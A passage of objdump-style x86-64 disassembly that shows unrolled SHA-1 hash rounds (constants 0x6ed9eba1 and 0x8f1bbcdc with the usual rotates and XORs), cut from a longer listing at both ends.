  404bbd:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404bc4:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404bc8:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404bcf:	89 c0                	mov    %eax,%eax
  404bd1:	48 c1 e8 1f          	shr    $0x1f,%rax
  404bd5:	48 09 c8             	or     %rcx,%rax
  404bd8:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  404bdc:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  404be0:	48 01 c2             	add    %rax,%rdx
  404be3:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404bea:	48 01 d0             	add    %rdx,%rax
  404bed:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404bf3:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404bfa:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404c01:	48 c1 e0 1e          	shl    $0x1e,%rax
  404c05:	48 89 c2             	mov    %rax,%rdx
  404c08:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404c0f:	89 c0                	mov    %eax,%eax
  404c11:	48 c1 e8 02          	shr    $0x2,%rax
  404c15:	48 09 d0             	or     %rdx,%rax
  404c18:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404c1f:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  404c23:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  404c27:	48 31 c2             	xor    %rax,%rdx
  404c2a:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  404c2e:	48 31 c2             	xor    %rax,%rdx
  404c31:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  404c35:	48 31 d0             	xor    %rdx,%rax
  404c38:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404c3f:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404c46:	48 c1 e0 05          	shl    $0x5,%rax
  404c4a:	48 89 c2             	mov    %rax,%rdx
  404c4d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404c54:	89 c0                	mov    %eax,%eax
  404c56:	48 c1 e8 1b          	shr    $0x1b,%rax
  404c5a:	48 89 d1             	mov    %rdx,%rcx
  404c5d:	48 09 c1             	or     %rax,%rcx
  404c60:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404c67:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  404c6e:	48 31 d0             	xor    %rdx,%rax
  404c71:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  404c78:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404c7c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404c83:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404c87:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404c8e:	89 c0                	mov    %eax,%eax
  404c90:	48 c1 e8 1f          	shr    $0x1f,%rax
  404c94:	48 09 c8             	or     %rcx,%rax
  404c97:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  404c9b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  404c9f:	48 01 c2             	add    %rax,%rdx
  404ca2:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404ca9:	48 01 d0             	add    %rdx,%rax
  404cac:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404cb2:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404cb9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404cc0:	48 c1 e0 1e          	shl    $0x1e,%rax
  404cc4:	48 89 c2             	mov    %rax,%rdx
  404cc7:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404cce:	89 c0                	mov    %eax,%eax
  404cd0:	48 c1 e8 02          	shr    $0x2,%rax
  404cd4:	48 09 d0             	or     %rdx,%rax
  404cd7:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404cde:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  404ce2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  404ce6:	48 31 c2             	xor    %rax,%rdx
  404ce9:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  404ced:	48 31 c2             	xor    %rax,%rdx
  404cf0:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  404cf4:	48 31 d0             	xor    %rdx,%rax
  404cf7:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404cfe:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404d05:	48 c1 e0 05          	shl    $0x5,%rax
  404d09:	48 89 c2             	mov    %rax,%rdx
  404d0c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404d13:	89 c0                	mov    %eax,%eax
  404d15:	48 c1 e8 1b          	shr    $0x1b,%rax
  404d19:	48 89 d1             	mov    %rdx,%rcx
  404d1c:	48 09 c1             	or     %rax,%rcx
  404d1f:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404d26:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  404d2d:	48 31 d0             	xor    %rdx,%rax
  404d30:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  404d37:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404d3b:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404d42:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404d46:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404d4d:	89 c0                	mov    %eax,%eax
  404d4f:	48 c1 e8 1f          	shr    $0x1f,%rax
  404d53:	48 09 c8             	or     %rcx,%rax
  404d56:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  404d5a:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  404d5e:	48 01 c2             	add    %rax,%rdx
  404d61:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404d68:	48 01 d0             	add    %rdx,%rax
  404d6b:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404d71:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404d78:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404d7f:	48 c1 e0 1e          	shl    $0x1e,%rax
  404d83:	48 89 c2             	mov    %rax,%rdx
  404d86:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404d8d:	89 c0                	mov    %eax,%eax
  404d8f:	48 c1 e8 02          	shr    $0x2,%rax
  404d93:	48 09 d0             	or     %rdx,%rax
  404d96:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404d9d:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  404da1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  404da5:	48 31 c2             	xor    %rax,%rdx
  404da8:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404dac:	48 31 c2             	xor    %rax,%rdx
  404daf:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  404db3:	48 31 d0             	xor    %rdx,%rax
  404db6:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404dbd:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404dc4:	48 c1 e0 05          	shl    $0x5,%rax
  404dc8:	48 89 c2             	mov    %rax,%rdx
  404dcb:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404dd2:	89 c0                	mov    %eax,%eax
  404dd4:	48 c1 e8 1b          	shr    $0x1b,%rax
  404dd8:	48 89 d1             	mov    %rdx,%rcx
  404ddb:	48 09 c1             	or     %rax,%rcx
  404dde:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404de5:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  404dec:	48 31 d0             	xor    %rdx,%rax
  404def:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  404df6:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404dfa:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404e01:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404e05:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404e0c:	89 c0                	mov    %eax,%eax
  404e0e:	48 c1 e8 1f          	shr    $0x1f,%rax
  404e12:	48 09 c8             	or     %rcx,%rax
  404e15:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  404e19:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  404e1d:	48 01 c2             	add    %rax,%rdx
  404e20:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404e27:	48 01 d0             	add    %rdx,%rax
  404e2a:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404e30:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404e37:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404e3e:	48 c1 e0 1e          	shl    $0x1e,%rax
  404e42:	48 89 c2             	mov    %rax,%rdx
  404e45:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404e4c:	89 c0                	mov    %eax,%eax
  404e4e:	48 c1 e8 02          	shr    $0x2,%rax
  404e52:	48 09 d0             	or     %rdx,%rax
  404e55:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404e5c:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  404e60:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  404e64:	48 31 c2             	xor    %rax,%rdx
  404e67:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  404e6b:	48 31 c2             	xor    %rax,%rdx
  404e6e:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  404e72:	48 31 d0             	xor    %rdx,%rax
  404e75:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404e7c:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404e83:	48 c1 e0 05          	shl    $0x5,%rax
  404e87:	48 89 c2             	mov    %rax,%rdx
  404e8a:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404e91:	89 c0                	mov    %eax,%eax
  404e93:	48 c1 e8 1b          	shr    $0x1b,%rax
  404e97:	48 89 d1             	mov    %rdx,%rcx
  404e9a:	48 09 c1             	or     %rax,%rcx
  404e9d:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404ea4:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  404eab:	48 31 d0             	xor    %rdx,%rax
  404eae:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  404eb5:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404eb9:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404ec0:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404ec4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404ecb:	89 c0                	mov    %eax,%eax
  404ecd:	48 c1 e8 1f          	shr    $0x1f,%rax
  404ed1:	48 09 c8             	or     %rcx,%rax
  404ed4:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  404ed8:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  404edc:	48 01 c2             	add    %rax,%rdx
  404edf:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404ee6:	48 01 d0             	add    %rdx,%rax
  404ee9:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404eef:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404ef6:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404efd:	48 c1 e0 1e          	shl    $0x1e,%rax
  404f01:	48 89 c2             	mov    %rax,%rdx
  404f04:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404f0b:	89 c0                	mov    %eax,%eax
  404f0d:	48 c1 e8 02          	shr    $0x2,%rax
  404f11:	48 09 d0             	or     %rdx,%rax
  404f14:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404f1b:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
  404f1f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  404f23:	48 31 c2             	xor    %rax,%rdx
  404f26:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  404f2a:	48 31 c2             	xor    %rax,%rdx
  404f2d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404f31:	48 31 d0             	xor    %rdx,%rax
  404f34:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404f3b:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404f42:	48 c1 e0 05          	shl    $0x5,%rax
  404f46:	48 89 c2             	mov    %rax,%rdx
  404f49:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404f50:	89 c0                	mov    %eax,%eax
  404f52:	48 c1 e8 1b          	shr    $0x1b,%rax
  404f56:	48 89 d1             	mov    %rdx,%rcx
  404f59:	48 09 c1             	or     %rax,%rcx
  404f5c:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404f63:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  404f6a:	48 31 d0             	xor    %rdx,%rax
  404f6d:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  404f74:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404f78:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404f7f:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404f83:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404f8a:	89 c0                	mov    %eax,%eax
  404f8c:	48 c1 e8 1f          	shr    $0x1f,%rax
  404f90:	48 09 c8             	or     %rcx,%rax
  404f93:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  404f97:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404f9b:	48 01 c2             	add    %rax,%rdx
  404f9e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404fa5:	48 01 d0             	add    %rdx,%rax
  404fa8:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404fae:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404fb5:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404fbc:	48 c1 e0 1e          	shl    $0x1e,%rax
  404fc0:	48 89 c2             	mov    %rax,%rdx
  404fc3:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404fca:	89 c0                	mov    %eax,%eax
  404fcc:	48 c1 e8 02          	shr    $0x2,%rax
  404fd0:	48 09 d0             	or     %rdx,%rax
  404fd3:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404fda:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  404fde:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  404fe2:	48 31 c2             	xor    %rax,%rdx
  404fe5:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  404fe9:	48 31 c2             	xor    %rax,%rdx
  404fec:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  404ff0:	48 31 d0             	xor    %rdx,%rax
  404ff3:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404ffa:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405001:	48 c1 e0 05          	shl    $0x5,%rax
  405005:	48 89 c2             	mov    %rax,%rdx
  405008:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40500f:	89 c0                	mov    %eax,%eax
  405011:	48 c1 e8 1b          	shr    $0x1b,%rax
  405015:	48 89 d1             	mov    %rdx,%rcx
  405018:	48 09 c1             	or     %rax,%rcx
  40501b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405022:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405029:	48 31 d0             	xor    %rdx,%rax
  40502c:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  405033:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405037:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40503e:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405042:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405049:	89 c0                	mov    %eax,%eax
  40504b:	48 c1 e8 1f          	shr    $0x1f,%rax
  40504f:	48 09 c8             	or     %rcx,%rax
  405052:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  405056:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40505a:	48 01 c2             	add    %rax,%rdx
  40505d:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405064:	48 01 d0             	add    %rdx,%rax
  405067:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  40506d:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405074:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40507b:	48 c1 e0 1e          	shl    $0x1e,%rax
  40507f:	48 89 c2             	mov    %rax,%rdx
  405082:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405089:	89 c0                	mov    %eax,%eax
  40508b:	48 c1 e8 02          	shr    $0x2,%rax
  40508f:	48 09 d0             	or     %rdx,%rax
  405092:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  405099:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
  40509d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4050a1:	48 31 c2             	xor    %rax,%rdx
  4050a4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4050a8:	48 31 c2             	xor    %rax,%rdx
  4050ab:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  4050af:	48 31 d0             	xor    %rdx,%rax
  4050b2:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4050b9:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4050c0:	48 c1 e0 05          	shl    $0x5,%rax
  4050c4:	48 89 c2             	mov    %rax,%rdx
  4050c7:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4050ce:	89 c0                	mov    %eax,%eax
  4050d0:	48 c1 e8 1b          	shr    $0x1b,%rax
  4050d4:	48 89 d1             	mov    %rdx,%rcx
  4050d7:	48 09 c1             	or     %rax,%rcx
  4050da:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4050e1:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4050e8:	48 31 d0             	xor    %rdx,%rax
  4050eb:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  4050f2:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4050f6:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4050fd:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405101:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405108:	89 c0                	mov    %eax,%eax
  40510a:	48 c1 e8 1f          	shr    $0x1f,%rax
  40510e:	48 09 c8             	or     %rcx,%rax
  405111:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  405115:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  405119:	48 01 c2             	add    %rax,%rdx
  40511c:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405123:	48 01 d0             	add    %rdx,%rax
  405126:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  40512c:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405133:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40513a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40513e:	48 89 c2             	mov    %rax,%rdx
  405141:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405148:	89 c0                	mov    %eax,%eax
  40514a:	48 c1 e8 02          	shr    $0x2,%rax
  40514e:	48 09 d0             	or     %rdx,%rax
  405151:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  405158:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
  40515c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  405160:	48 31 c2             	xor    %rax,%rdx
  405163:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  405167:	48 31 c2             	xor    %rax,%rdx
  40516a:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40516e:	48 31 d0             	xor    %rdx,%rax
  405171:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405178:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40517f:	48 c1 e0 05          	shl    $0x5,%rax
  405183:	48 89 c2             	mov    %rax,%rdx
  405186:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40518d:	89 c0                	mov    %eax,%eax
  40518f:	48 c1 e8 1b          	shr    $0x1b,%rax
  405193:	48 89 d1             	mov    %rdx,%rcx
  405196:	48 09 c1             	or     %rax,%rcx
  405199:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4051a0:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4051a7:	48 89 d6             	mov    %rdx,%rsi
  4051aa:	48 21 c6             	and    %rax,%rsi
  4051ad:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4051b4:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4051bb:	48 09 d0             	or     %rdx,%rax
  4051be:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  4051c5:	48 09 f0             	or     %rsi,%rax
  4051c8:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4051cc:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4051d3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4051d7:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4051de:	89 c0                	mov    %eax,%eax
  4051e0:	48 c1 e8 1f          	shr    $0x1f,%rax
  4051e4:	48 09 c8             	or     %rcx,%rax
  4051e7:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4051eb:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4051ef:	48 01 c2             	add    %rax,%rdx
  4051f2:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4051f9:	48 01 c2             	add    %rax,%rdx
  4051fc:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405201:	48 01 d0             	add    %rdx,%rax
  405204:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  40520b:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405212:	48 c1 e0 1e          	shl    $0x1e,%rax
  405216:	48 89 c2             	mov    %rax,%rdx
  405219:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405220:	89 c0                	mov    %eax,%eax
  405222:	48 c1 e8 02          	shr    $0x2,%rax
  405226:	48 09 d0             	or     %rdx,%rax
  405229:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405230:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  405234:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  405238:	48 31 c2             	xor    %rax,%rdx
  40523b:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  40523f:	48 31 c2             	xor    %rax,%rdx
  405242:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  405246:	48 31 d0             	xor    %rdx,%rax
  405249:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405250:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405257:	48 c1 e0 05          	shl    $0x5,%rax
  40525b:	48 89 c2             	mov    %rax,%rdx
  40525e:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405265:	89 c0                	mov    %eax,%eax
  405267:	48 c1 e8 1b          	shr    $0x1b,%rax
  40526b:	48 89 d1             	mov    %rdx,%rcx
  40526e:	48 09 c1             	or     %rax,%rcx
  405271:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405278:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  40527f:	48 89 d6             	mov    %rdx,%rsi
  405282:	48 21 c6             	and    %rax,%rsi
  405285:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40528c:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  405293:	48 09 d0             	or     %rdx,%rax
  405296:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  40529d:	48 09 f0             	or     %rsi,%rax
  4052a0:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4052a4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4052ab:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4052af:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4052b6:	89 c0                	mov    %eax,%eax
  4052b8:	48 c1 e8 1f          	shr    $0x1f,%rax
  4052bc:	48 09 c8             	or     %rcx,%rax
  4052bf:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  4052c3:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4052c7:	48 01 c2             	add    %rax,%rdx
  4052ca:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4052d1:	48 01 c2             	add    %rax,%rdx
  4052d4:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  4052d9:	48 01 d0             	add    %rdx,%rax
  4052dc:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4052e3:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4052ea:	48 c1 e0 1e          	shl    $0x1e,%rax
  4052ee:	48 89 c2             	mov    %rax,%rdx
  4052f1:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4052f8:	89 c0                	mov    %eax,%eax
  4052fa:	48 c1 e8 02          	shr    $0x2,%rax
  4052fe:	48 09 d0             	or     %rdx,%rax
  405301:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405308:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  40530c:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405310:	48 31 c2             	xor    %rax,%rdx
  405313:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  405317:	48 31 c2             	xor    %rax,%rdx
  40531a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40531e:	48 31 d0             	xor    %rdx,%rax
  405321:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405328:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40532f:	48 c1 e0 05          	shl    $0x5,%rax
  405333:	48 89 c2             	mov    %rax,%rdx
  405336:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40533d:	89 c0                	mov    %eax,%eax
  40533f:	48 c1 e8 1b          	shr    $0x1b,%rax
  405343:	48 89 d1             	mov    %rdx,%rcx
  405346:	48 09 c1             	or     %rax,%rcx
  405349:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405350:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  405357:	48 89 d6             	mov    %rdx,%rsi
  40535a:	48 21 c6             	and    %rax,%rsi
  40535d:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405364:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  40536b:	48 09 d0             	or     %rdx,%rax
  40536e:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  405375:	48 09 f0             	or     %rsi,%rax
  405378:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40537c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405383:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405387:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40538e:	89 c0                	mov    %eax,%eax
  405390:	48 c1 e8 1f          	shr    $0x1f,%rax
  405394:	48 09 c8             	or     %rcx,%rax
  405397:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  40539b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40539f:	48 01 c2             	add    %rax,%rdx
  4053a2:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4053a9:	48 01 c2             	add    %rax,%rdx
  4053ac:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  4053b1:	48 01 d0             	add    %rdx,%rax
  4053b4:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4053bb:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4053c2:	48 c1 e0 1e          	shl    $0x1e,%rax
  4053c6:	48 89 c2             	mov    %rax,%rdx
  4053c9:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4053d0:	89 c0                	mov    %eax,%eax
  4053d2:	48 c1 e8 02          	shr    $0x2,%rax
  4053d6:	48 09 d0             	or     %rdx,%rax
